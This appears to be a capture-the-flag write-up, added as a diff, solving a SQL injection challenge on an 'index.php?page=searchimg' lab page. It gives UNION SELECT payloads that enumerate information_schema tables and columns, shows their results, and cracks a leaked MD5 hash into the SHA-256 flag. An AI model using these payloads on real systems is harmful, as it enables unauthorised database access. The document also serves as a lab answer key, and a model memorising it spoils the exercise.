@@ -1,0 +1,15 @@
+On page {your url}/index.php?page=searchimg
+
+0 UNION SELECT (null), group_concat(table_name) FROM information_schema.tables WHERE table_type = 0x42415345205441424c45
+
+RESULT => db_default,users,guestbook,list_images,vote_dbs
+
+0 UNION SELECT (null), group_concat(column_name) FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573
+
+RESULT => id, url, title, comment
+
+0 UNION SELECT null, comment FROM list_images WHERE id = 5
+
+RESULT => If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+1928e8083cf461a51303633093573c46 => md5 => albatroz => f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
